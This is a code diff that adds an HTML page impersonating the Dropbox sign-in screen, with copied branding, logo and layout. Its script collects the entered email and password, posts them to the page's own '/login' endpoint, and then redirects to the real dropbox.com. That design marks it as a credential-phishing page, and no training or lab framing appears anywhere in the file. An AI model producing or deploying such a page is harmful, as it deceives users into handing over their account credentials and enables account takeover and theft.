@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Dropbox</title>
+    <style>
+        body {
+            font-family: "Sharp Grotesk", "Atlas Grotesk", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 400px;
+            padding: 40px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+        .logo img {
+            height: 34px;
+        }
+        h2 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #1e1919;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #637282;
+            border-radius: 0;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #0061fe;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 97, 254, 0.2);
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .forgot {
+            color: #0061fe;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .login-btn {
+            background-color: #0061fe;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        .login-btn:hover {
+            background-color: #0055d4;
+        }
+        .google-btn, .apple-btn {
+            background: transparent;
+            border: 1px solid #c0c0c0;
+            color: #1e1919;
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+        .divider span {
+            background: #fff;
+            padding: 0 10px;
+            color: #637282;
+            font-size: 12px;
+        }
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            border-top: 1px solid #e6e8eb;
+            z-index: -1;
+        }
+    </style>
+    <script>
+        async function handleLogin(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    window.location.href = "https://www.dropbox.com";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Dropbox_Icon.svg/500px-Dropbox_Icon.svg.png" alt="Dropbox">
+                <span style="font-weight: bold; font-size: 24px; vertical-align: middle; margin-left: 10px;">Dropbox</span>
+            </div>
+        </div>
+        
+        <h2>Sign in</h2>
+        
+        <button class="google-btn">Sign in with Google</button>
+        <button class="apple-btn">Sign in with Apple</button>
+        
+        <div class="divider">
+            <span>or</span>
+        </div>
+        
+        <form id="login-form" onsubmit="handleLogin(event)">
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <div class="actions">
+                <label style="display: flex; align-items: center; font-weight: normal;">
+                    <input type="checkbox" style="width: auto; margin-right: 10px;"> Remember me
+                </label>
+                <a href="#" class="forgot">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="login-btn">Sign in</button>
+        </form>
+    </div>
+</body>
+</html>
